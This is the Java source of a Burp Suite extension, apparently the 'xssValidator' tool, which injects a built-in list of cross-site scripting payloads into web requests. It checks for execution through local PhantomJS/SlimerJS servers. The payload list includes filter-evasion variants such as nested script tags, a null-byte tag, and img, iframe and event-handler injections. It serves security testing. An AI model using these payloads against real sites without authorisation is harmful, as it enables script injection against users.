package burp;

import java.awt.BorderLayout;
import java.awt.GridLayout;
import java.awt.Font;
import java.awt.Component;
import java.awt.Dimension;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;
import java.net.URL;

import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.ScrollPaneConstants;
import javax.swing.SwingUtilities;

import org.apache.commons.codec.binary.Base64;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import burp.ITab;

public class BurpExtender implements IBurpExtender, ITab, IHttpListener,
IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor, IScannerCheck {
    private static final String VERSION = "1.3.0";

    public IBurpExtenderCallbacks mCallbacks;
    private IExtensionHelpers     helpers;
    private PrintWriter           stdout;
    private PrintWriter           stderr;
    private HttpClient            client;
    private static String         phantomServer            = "http://127.0.0.1:8093";

    private static String         slimerServer             = "http://127.0.0.1:8094";

    public static String         triggerPhrase            = "299792458";
    public static String         grepPhrase               = "fy7sdufsuidfhuisdf";
    public JLabel                 htmlDescription;
    public JPanel                 mainPanel;
    public JPanel                 leftPanel;
    public JPanel                 serverConfig;
    public JPanel                 notice;
    public JPanel                 rightPanel;
    public JTextField             phantomURL;
    public JTextField             slimerURL;
    public JTextField             grepVal;
    public JTabbedPane            tabbedPane;
    public JButton                btnAddText;
    public JButton                btnSaveTabAsTemplate;
    public JButton                btnRemoveTab;
    public JTextField             functionsTextfield;
    public JTextArea              attackStringsTextarea;
    public JTextField             eventHandlerTextfield;
    public JScrollPane            scrollingArea;
    public static final String    JAVASCRIPT_PLACEHOLDER   = "{JAVASCRIPT}";
    public static final String    EVENTHANDLER_PLACEHOLDER = "{EVENTHANDLER}";


    public static final byte[][]  PAYLOADS = {
            ("<script>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</script>").getBytes(),
            ("<scr ipt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</scr ipt>").getBytes(),
            ("\"><script>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</script>").getBytes(),
            ("\"><script>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</script><\"").getBytes(),
            ("'><script>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</script>").getBytes(),
            ("'><script>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</script><'").getBytes(),
            ("<SCRIPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";</SCRIPT>").getBytes(),
            ("<scri<script>pt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";</scr</script>ipt>").getBytes(),
            ("<SCRI<script>PT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";</SCR</script>IPT>").getBytes(),
            ("<scri<scr<script>ipt>pt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";</scr</sc</script>ript>ipt>").getBytes(),
            ("\";" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";\"").getBytes(),
            ("';" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";'").getBytes(),
            (";" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";").getBytes(),
            ("<SCR%00IPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</SCR%00IPT>").getBytes(),
            ("\\\";" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";//").getBytes(),
            ("<STYLE TYPE=\"text/javascript\">"
                + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";</STYLE>").getBytes(),
            ("<<SCRIPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "//<</SCRIPT>").getBytes(),
            ("\"" + BurpExtender.EVENTHANDLER_PLACEHOLDER + "="
                    + BurpExtender.JAVASCRIPT_PLACEHOLDER + " ").getBytes(),
            ("<<SCRIPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "//<</SCRIPT>").getBytes(),
            ("<img src=\"1\" onerror=\"" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "\">").getBytes(),
            ("<img src='1' onerror='" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "'").getBytes(),
            ("onerror=\"" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "\"").getBytes(),
            ("onerror='" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "'").getBytes(),
            ("onload=\"" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "\"").getBytes(),
            ("onload='" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "'").getBytes(),
            ("<IMG \"\"\"><SCRIPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</SCRIPT>\">").getBytes(),
            ("<IMG '''><SCRIPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</SCRIPT>'>").getBytes(),
            ("\"\"\"><SCRIPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "").getBytes(),
            ("'''><SCRIPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "'").getBytes(),
            ("<IFRAME SRC='f' onerror=\"" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "\"></IFRAME>").getBytes(),
            ("<IFRAME SRC='f' onerror='" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "'></IFRAME>").getBytes()
        };

    public IIntruderPayloadGenerator createNewInstance(IIntruderAttack attack) {

        return new IntruderPayloadGenerator(this);
    }

    public String getGeneratorName() {

        return "XSS Validator Payloads";
    }

    public String getProcessorName() {

        return "XSS Validator";
    }

    public String getTabCaption() {

        return "xssValidator";
    }

    public Component getUiComponent() {

        return this.mainPanel;
    }

    public void processHttpMessage(int toolFlag, boolean messageIsRequest,
            IHttpRequestResponse messageInfo) {

        if ((toolFlag != 32) || (!messageIsRequest)) {
            if ((toolFlag == 32) && (!messageIsRequest)) {
                HttpPost PhantomJs = new HttpPost(this.phantomURL.getText());
                HttpPost SlimerJS = new HttpPost(this.slimerURL.getText());
                try {
                    byte[] encodedBytes = Base64.encodeBase64(messageInfo
                            .getResponse());
                    String encodedResponse = this.helpers
                            .bytesToString(encodedBytes);

                    List nameValuePairs = new ArrayList(1);
                    nameValuePairs.add(new BasicNameValuePair("http-response",
                            encodedResponse));

                    PhantomJs
                    .setEntity(new UrlEncodedFormEntity(nameValuePairs));

                    HttpResponse response = this.client.execute(PhantomJs);
                    String responseAsString = EntityUtils.toString(response
                            .getEntity());

                    this.stdout.println("Response: " + responseAsString);

                    if (responseAsString.toLowerCase().contains(
                            BurpExtender.triggerPhrase.toLowerCase())) {
                        String newResponse = this.helpers
                                .bytesToString(messageInfo.getResponse())
                                + this.grepVal.getText();
                        messageInfo.setResponse(this.helpers
                                .stringToBytes(newResponse));
                        this.stdout.println("XSS Found");
                    }
                }catch (Exception e) {
                    this.stderr.println(e.getMessage());
                }

                try {
                    byte[] encodedBytes = Base64.encodeBase64(messageInfo
                            .getResponse());
                    String encodedResponse = this.helpers
                            .bytesToString(encodedBytes);

                    List nameValuePairs = new ArrayList(1);
                    nameValuePairs.add(new BasicNameValuePair("http-response",
                            encodedResponse));

                    SlimerJS.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                    HttpResponse response = this.client.execute(SlimerJS);
                    String responseAsString = EntityUtils.toString(response
                            .getEntity());

                    this.stdout.println("Response: " + responseAsString);

                    if (responseAsString.toLowerCase().contains(
                            BurpExtender.triggerPhrase.toLowerCase())) {
                        String newResponse = this.helpers
                                .bytesToString(messageInfo.getResponse())
                                + this.grepVal.getText();
                        messageInfo.setResponse(this.helpers
                                .stringToBytes(newResponse));
                        this.stdout.println("XSS Found");
                    }
                }catch (Exception e) {
                    this.stderr.println(e.getMessage());
                }
            }
        }
    }

    public byte[] processPayload(byte[] currentPayload, byte[] originalPayload,
            byte[] baseValue) {

        return this.helpers.stringToBytes(this.helpers.urlEncode(this.helpers
                .bytesToString(currentPayload)));
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        /*
         * Currently not supporting passive scans.
         * The eventual plan is to keep a running log of all dynamically
         * generated trigger phrases. This will allow us to compare each xss-detector
         * response with the ongoing list to see if any previous payloads are executed.
         * This will be useful in detecting stored XSS.
         */
        return null;

    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        IntruderPayloadGenerator payloadGenerator = new IntruderPayloadGenerator(this);
        BurpExtender.this.stdout.println("Beginning active scan with xssValidator");
        // Prepare to start attacks
        while(payloadGenerator.hasMorePayloads()) {
            byte[] payload = payloadGenerator.getNextPayload(new byte[1]);
            byte[] checkRequest = insertionPoint.buildRequest(payload);
            IHttpRequestResponse messageInfo = mCallbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkRequest);

            // Too much code duplication, but for now it's ok
            HttpPost PhantomJs = new HttpPost(this.phantomURL.getText());
            HttpPost SlimerJS = new HttpPost(this.slimerURL.getText());

            Boolean vulnerable = false;

            try {
                byte[] encodedBytes = Base64.encodeBase64(messageInfo
                        .getResponse());
                String encodedResponse = this.helpers
                        .bytesToString(encodedBytes);

                List nameValuePairs = new ArrayList(1);
                nameValuePairs.add(new BasicNameValuePair("http-response",
                        encodedResponse));

                PhantomJs
                .setEntity(new UrlEncodedFormEntity(nameValuePairs));

                HttpResponse response = this.client.execute(PhantomJs);
                String responseAsString = EntityUtils.toString(response
                        .getEntity());

                this.stdout.println("Response: " + responseAsString);

                if (responseAsString.toLowerCase().contains(
                        BurpExtender.triggerPhrase.toLowerCase())) {
                    String newResponse = this.helpers
                            .bytesToString(messageInfo.getResponse())
                            + this.grepVal.getText();
                    messageInfo.setResponse(this.helpers
                            .stringToBytes(newResponse));
                    this.stdout.println("XSS Found");
                    vulnerable = true;

                }
            }catch (Exception e) {
                this.stderr.println(e.getMessage());
            }

            try {
                byte[] encodedBytes = Base64.encodeBase64(messageInfo
                        .getResponse());
                String encodedResponse = this.helpers
                        .bytesToString(encodedBytes);

                List nameValuePairs = new ArrayList(1);
                nameValuePairs.add(new BasicNameValuePair("http-response",
                        encodedResponse));

                SlimerJS.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                HttpResponse response = this.client.execute(SlimerJS);
                String responseAsString = EntityUtils.toString(response
                        .getEntity());

                this.stdout.println("Response: " + responseAsString);

                if (responseAsString.toLowerCase().contains(
                        BurpExtender.triggerPhrase.toLowerCase())) {
                    String newResponse = this.helpers
                            .bytesToString(messageInfo.getResponse())
                            + this.grepVal.getText();
                    messageInfo.setResponse(this.helpers
                            .stringToBytes(newResponse));
                    this.stdout.println("XSS Found");
                    vulnerable = true;
                }
            }catch (Exception e) {
                this.stderr.println(e.getMessage());
            }

            // Update this to actually detect matches
            List<int[]> matches = new ArrayList<int[]>();
            byte[] response = baseRequestResponse.getResponse();
            matches.add(new int[] { 0, 1 });

            if(vulnerable) {
                String payloadStr = new String(payload);
                 // get the offsets of the payload within the request, for in-UI highlighting
                List<int[]> requestHighlights = new ArrayList<>(1);
                requestHighlights.add(insertionPoint.getPayloadOffsets(payload));

                // report the issue
                List<IScanIssue> issues = new ArrayList<>(1);
                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        helpers.analyzeRequest(baseRequestResponse).getUrl(), 
                        new IHttpRequestResponse[] { mCallbacks.applyMarkers(messageInfo, requestHighlights, matches) }, 
                        "Cross-Site Scripting (xssValidator)",
                        "xssValidator has determined that the application is vulnerable to reflected Cross-Site Scripting by injecting " +
                        "the payload into the application successfully. When executed within a scriptable browser " +
                        "the payload was found to execute, validating the vulnerability.",
                        "High"));
                return issues;
            }
        }
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        // This method is called when multiple issues are reported for the same URL 
        // path by the same extension-provided check. The value we return from this 
        // method determines how/whether Burp consolidates the multiple issues
        // to prevent duplication
        //
        // Since the issue name is sufficient to identify our issues as different,
        // if both issues have the same name, only report the existing issue
        // otherwise report both issues
        if (existingIssue.getIssueName().equals(newIssue.getIssueName()))
            return -1;
        else return 0;
    }

    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {

        this.mCallbacks = callbacks;

        this.client = HttpClientBuilder.create().build();
        this.helpers = callbacks.getHelpers();
        callbacks.setExtensionName("XSS Validator Payloads");
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.stderr = new PrintWriter(callbacks.getStderr(), true);
        callbacks.registerIntruderPayloadGeneratorFactory(this);
        callbacks.registerIntruderPayloadProcessor(this);
        callbacks.registerHttpListener(this);
        callbacks.registerScannerCheck(this);

        SwingUtilities.invokeLater(new Runnable() {

            public void run() {

                BurpExtender.this.functionsTextfield = new JTextField(30);
                BurpExtender.this.functionsTextfield
                        .setText("alert,console.log,confirm,prompt");

                BurpExtender.this.eventHandlerTextfield = new JTextField(30);
                BurpExtender.this.eventHandlerTextfield
                .setText("onmousemove,onmouseout,onmouseover");


                BurpExtender.this.mainPanel = new JPanel(new GridLayout(1, 2));
                BurpExtender.this.leftPanel = new JPanel(new GridLayout(2, 1));
                BurpExtender.this.rightPanel = new JPanel();

                /*
                 * Notice Stuff
                 */
                BurpExtender.this.notice = new JPanel();
                JLabel titleLabel = new JLabel("<html><center><h2>xssValidator</h2>Created By: <em>John Poulin</em> (@forced-request)<br />\n" +
                    "Version: " + BurpExtender.this.VERSION + "</center><br />");

                String initialText = "<html>\n" +
                "<em>xssValidator is an intruder extender with a customizable list of payloads, \n" +
                "that couples<br />with the Phantom.js and Slimer.js scriptable browsers to provide validation<br />\n" +
                "of cross-site scripting vulnerabilities.</em><br /><br />\n" +
                "<b>Getting started:</b>\n" +
                "<ul>\n" +
                "    <li>Download latest version of xss-detectors from the git repository</li>\n" +
                "    <li>Start the phantom server: phantomjs xss.js</li>\n" +
                "    <li>Create a new intruder tab, select <em>Extension-generated</em> \n" +
                "    payload.</li>" +
                "    <li>Under the intruder options tab, add the <em>Grep Phrase</em> to \n" +
                "    the <em>Grep-Match</em> panel</li>" +
                "    <li>Successful attacks will be denoted by presence of the <em>Grep Phrase</em>\n" +
                "</ul>\n"; 
                BurpExtender.this.htmlDescription = new JLabel(initialText);
                BurpExtender.this.notice.add(titleLabel);
                BurpExtender.this.notice.add(BurpExtender.this.htmlDescription);

                /*
                 Server Config
                 */
                BurpExtender.this.serverConfig = new JPanel(new GridLayout(5,2));

                BurpExtender.this.phantomURL = new JTextField(20);
                BurpExtender.this.phantomURL
                        .setText(BurpExtender.phantomServer);

                BurpExtender.this.slimerURL = new JTextField(20);
                BurpExtender.this.slimerURL.setText(BurpExtender.slimerServer);

                BurpExtender.this.grepVal = new JTextField(20);
                BurpExtender.this.grepVal.setText(BurpExtender.grepPhrase);

                JLabel phantomHeading = new JLabel("PhantomJS Server Settings");
                JLabel slimerHeading = new JLabel("Slimer Server Settings");
                JLabel grepHeading = new JLabel("Grep Phrase");

                BurpExtender.this.serverConfig.add(phantomHeading);
                BurpExtender.this.serverConfig
                        .add(BurpExtender.this.phantomURL);

                BurpExtender.this.serverConfig.add(slimerHeading);
                BurpExtender.this.serverConfig.add(BurpExtender.this.slimerURL);

                BurpExtender.this.serverConfig.add(grepHeading);
                BurpExtender.this.serverConfig.add(BurpExtender.this.grepVal);

                JLabel functionsLabel = new JLabel("Javascript functions");
                BurpExtender.this.serverConfig.add(functionsLabel);
                BurpExtender.this.serverConfig
                .add(BurpExtender.this.functionsTextfield);

                JLabel eventHandlerLabel = new JLabel(
                        "Javascript event handlers");
                BurpExtender.this.serverConfig.add(eventHandlerLabel);
                BurpExtender.this.serverConfig
                .add(BurpExtender.this.eventHandlerTextfield);

                /*
                 * Right Panel
                 */
                String payloads = "";
                for (byte[] bs:BurpExtender.PAYLOADS) {
                    payloads += new String(bs) + "\r\n";
                }

                BurpExtender.this.attackStringsTextarea = new JTextArea(30, 50);
                BurpExtender.this.attackStringsTextarea.setText(payloads);

                BurpExtender.this.scrollingArea = new JScrollPane(
                        BurpExtender.this.attackStringsTextarea,
                        ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS,
                        ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);

                JLabel payloadLabel = new JLabel("<html><center><h3>Payloads</h3>Custom Payloads \n" +
                        "can be defined here, seperated by linebreaks.<Br /></center><ul><li><b>{JAVASCRIPT}</b>\n" +
                        "placeholders define the location of the Javascript function.</li>\n" +
                        "<li><b>{EVENTHANDLER}</b> placeholders define location of Javascript events, <br />\n" +
                        "such as onmouseover, that are tested via scriptable browsers.</li></ul>");
                BurpExtender.this.rightPanel.add(payloadLabel);
                BurpExtender.this.rightPanel
                        .add(BurpExtender.this.scrollingArea);

                BurpExtender.this.leftPanel.add(BurpExtender.this.notice);
                BurpExtender.this.leftPanel.add(BurpExtender.this.serverConfig);


                BurpExtender.this.mainPanel.add(BurpExtender.this.leftPanel);
                BurpExtender.this.mainPanel.add(BurpExtender.this.rightPanel);
                BurpExtender.this.mCallbacks
                        .customizeUiComponent(BurpExtender.this.mainPanel);
                BurpExtender.this.mCallbacks.addSuiteTab(BurpExtender.this);
            }
        });
    }

    class IntruderPayloadGenerator implements IIntruderPayloadGenerator {

    int          payloadIndex;
    String[]     functions         = {"alert", "console.log", "confirm",
                                           "prompt"};
    String[]     eventHandler      = null;
    int          functionIndex     = 0;
    int          eventHandlerIndex = 0;
    BurpExtender extenderInstance  = null;
    String[]     PAYLOADS          = null;

    IntruderPayloadGenerator(BurpExtender extenderInstance) {

        this.extenderInstance = extenderInstance;
        this.functions = extenderInstance.functionsTextfield.getText()
                .split(",");
        this.eventHandler = extenderInstance.eventHandlerTextfield
                .getText().split(",");

        // Add extra newline before processing to ensure that we can
        // grab the last item from the list.
        
        String payloads = extenderInstance.attackStringsTextarea.getText() + "\n";
        this.PAYLOADS = payloads.split("\n");

    }

    public byte[] getNextPayload(byte[] baseValue) {

        if ((this.eventHandler.length > 0)
                && (this.eventHandlerIndex >= this.eventHandler.length)) {
            this.eventHandlerIndex = 0;
            this.functionIndex += 1;
        }

        if (this.functionIndex >= this.functions.length) {
            this.functionIndex = 0;
            this.eventHandlerIndex = 0;
            this.payloadIndex += 1;
        }

        String payload = this.PAYLOADS[this.payloadIndex];
        boolean eventhandlerIsUsed = payload
                .contains(BurpExtender.EVENTHANDLER_PLACEHOLDER);


        // String nextPayload = new String(payload);
        if (eventhandlerIsUsed) {
            payload = payload.replace(
                    BurpExtender.EVENTHANDLER_PLACEHOLDER,
                    this.eventHandler[this.eventHandlerIndex]);
        }

        payload = payload.replace(BurpExtender.JAVASCRIPT_PLACEHOLDER,
                this.functions[this.functionIndex] + "("
                        + BurpExtender.triggerPhrase + ")");


        BurpExtender.this.stdout.println("Payload conversion: " + payload);

        if (!eventhandlerIsUsed) {
            this.functionIndex += 1;
        }
        else {
            this.eventHandlerIndex += 1;
        }
        return payload.getBytes();
    }

    public boolean hasMorePayloads() {

        return this.payloadIndex < BurpExtender.PAYLOADS.length;
    }

    public void reset() {

        this.payloadIndex = 0;
    }
}
}

//
// class implementing IScanIssue to hold our custom scan issue details
//
class CustomScanIssue implements IScanIssue
{
    private IHttpService httpService;
    private URL url;
    private IHttpRequestResponse[] httpMessages;
    private String name;
    private String detail;
    private String severity;

    public CustomScanIssue(
            IHttpService httpService,
            URL url, 
            IHttpRequestResponse[] httpMessages, 
            String name,
            String detail,
            String severity)
    {
        this.httpService = httpService;
        this.url = url;
        this.httpMessages = httpMessages;
        this.name = name;
        this.detail = detail;
        this.severity = severity;
    }
    
    @Override
    public URL getUrl()
    {
        return url;
    }

    @Override
    public String getIssueName()
    {
        return name;
    }

    @Override
    public int getIssueType()
    {
        return 0;
    }

    @Override
    public String getSeverity()
    {
        return severity;
    }

    @Override
    public String getConfidence()
    {
        return "Certain";
    }

    @Override
    public String getIssueBackground()
    {
        return null;
    }

    @Override
    public String getRemediationBackground()
    {
        return null;
    }

    @Override
    public String getIssueDetail()
    {
        return detail;
    }

    @Override
    public String getRemediationDetail()
    {
        return null;
    }

    @Override
    public IHttpRequestResponse[] getHttpMessages()
    {
        return httpMessages;
    }

    @Override
    public IHttpService getHttpService()
    {
        return httpService;
    }   
}